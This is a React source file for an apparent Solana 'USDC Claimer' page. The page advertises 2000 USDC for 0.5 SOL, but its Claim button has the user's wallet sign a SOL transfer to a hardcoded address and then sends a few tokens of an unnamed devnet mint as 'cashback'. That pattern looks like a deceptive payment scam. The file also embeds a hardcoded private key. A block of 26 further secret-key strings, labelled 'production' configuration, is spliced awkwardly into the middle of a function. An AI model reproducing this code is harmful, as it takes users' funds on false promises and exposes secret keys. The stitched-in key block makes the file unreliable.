/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "s8KhHDJTMLs6pVmdDYyyT7XPARZqDEepS8d2qX73or2trz6frX7Lq3SckvMJMxe9x3H5xUqwDessNRXMwY59zj9"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2Nxvmf9uLbKNSVK4tPr8KwvKkgEWUmaWjs2hdzVchskukLbcUNpTx1AMiXLNx2yCfLVjCnxb3h9qj6XEGyLc7MeJ",
  "key1": "39cBy3UshgTyy5H67bprz6ML8X6UCYjyAi1wyvJ12knmVsJ1suK9hLq6Zx5SfTM9g5saaxNXQsbak9UHWebfa536",
  "key2": "3KduarGRHEBrWjyokZBX7gKhNNdZqQZDR3NrBvXmWp29RTMgYhRvuhpGqZ36UdJJbtsexwDJEwkD6w7LXP4hthCN",
  "key3": "6hMAVwKazbSqVMMsBDi5K5wnCpb7DztsFPjP4t97vSD1Nq5ryn9EkNxnzNggxNSJaTihShkBZq6nDDTyXDAinyH",
  "key4": "jJeUeTRZxqpZ8mnacoR561WaTFBaiorvdHtkq8HbpPqyk8qLR6ysPkx3wVEDR1LxQhqFgpx9Ndk4dJQhHCAAoSC",
  "key5": "5s4woagDaZiQeLTjnuupUbM1hBx9yy4zY6txxHoh5pDKSBSR4ivv82FxgaMyUcjHTrw1k2oHcHXQwytpYSjivBWM",
  "key6": "2htX8y4BW7iKtiFMWbeFmaMMspZggFVM9nN1VNHUDvrkiLDaYkGmxfteCgznPxmh5GUYTER5gbZLH3LLzSuCGGmS",
  "key7": "5c5Vfshpe4uuKWsXHy8FTGBVPAtCfd4RA7c1S3dnTqUC8FSF6aNShLDPkeNqLrAxAL3qUsbbiyp9mCCGEGziPpxi",
  "key8": "2T6EeFDGDXSk3Wgy9ZHp7FYT35dnHYSny5HcjycYmnmogqWBVVSGFymJcg2vw2KVwSK9trB4uskYRtLB2uLHc4dN",
  "key9": "8JQCerK4SxQnH4eejMb3863vkMDTBo5NpJYEzZWcRf3YkmfjRJd5b9nyQrSCjYyypCMvoX1Yco5Xhr31J5aoAKn",
  "key10": "5APewv4fLuMbjwpM1XZYyPEmuGG2NBL3M7wrFg5zzUdJd2GRNBVxov7UBvSfDJCwW66EgmTekX7qywhWW6EWkq5q",
  "key11": "b1EE27HEaR8zjadGttGQdyZBG7VFdLTCQAcsMKegMZQnj4VLVYBu13KUY96qMzzJ1QmWXhPgrwma6mMR5j7rRB9",
  "key12": "4aWRfrV47E6kjdJr33AwyrxVL9eoQfVKEK2wXHjTNka48vjuyjC8iGaCqES5RKbQVUeFetLLFVYbENZUsU3VB27R",
  "key13": "2XUJ1a9ffjnjHMYWuixQpZs2776skMY6bovr9JekEHzJVaH8KYfyAHRWMkz11DrzsFeU5SrQmEgqtsC4ioHFtt1D",
  "key14": "43ZHG9XAWZfJ6q3dFYmcYWfi3dQdKhNSCkebh38rPBY11fmkUzcwsqoCh2HXtPxRbhCfpmDuhRV8DFTxnagWKUY7",
  "key15": "5HDzStQW92RCJ5bXE4cfD76cCWQJxnzn34ekprccULYRWGqUmSGfsJB5C6nrVcj681wv8GcW1zpzYnVwa3sFvZ8d",
  "key16": "5ZNaaEagWy2hWBxDr5ZfJPs9e4FTYgkt9NjkZN8F2mdB2i2A9CZe3mT3B8gE7qhgz4fXqudkjBCaEi6SDwBCTrXr",
  "key17": "2B4oZWziRJB8Zk3sfp6Fqt765v2J6yRSrdzSiKzrmQoftn25aBZAkbchuGAW329SQDPMSTo2674tUFp4Tqok34vo",
  "key18": "3GgdAKU9ic57vND3MjuwYPEofFaMNHSCDGdp5DFvbWfmmiAW1jRDTACjK1R5G8PwYeWn9sLkNpDCAaHPSTDDNfPA",
  "key19": "3qEbirtxFYYuEsK5smQwVoYM62b24gdQQ79k1SLB7CbCwY2MxhYHYN8gPz6ug2he9JLfDqNZAyNbQS35dUMRfQaC",
  "key20": "5THqNXjdkiqNWiQkFM4N9ntk3bUATP6DmJ3wvnaqY4ZfvZyScDNykA8hwNzq4Sc26MweJV9wGbR9QEQcnDUEtGQ6",
  "key21": "5E7pFnLDnZTHHfRhqv8jWrBrPL6poE4rEPcFoiuSHNtwVri4FCcKaewPBeHoiwaB8i4vLZmxfboR2kpi3o267s1s",
  "key22": "GZ1giYhnrVUcKLsj285KY3KpSr7ajwreKiCYAxKCQ9LhawJGumbQAdKeHk32DEyRb1cVoQmGqKXT1dmZT5Gr3iF",
  "key23": "4wBMJ7TDmoE7oDBKPhaxoeUE9f7put9xCNMPN4JPmt6F8evFkqWEtDcm2kaKnbov4ajDHtUaPWWcYGegiMXgEYHf",
  "key24": "3kvj1FSyx5Luo4ZDZ5tZQax9Q64UFCN8eTVrt2sNJdVpF2sfBgN8qHnUjhTJzVTz4oCsARJjM1Kwp4DhN6vQJLiD",
  "key25": "C5ZQTRcmc1smz39uCSoTN8QZwgcSP3XBREjAkaB6e9dDjwzM9GwpvpXLFdjpM35XjHXPtcX1MJfoF4gvFXRAvmc"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
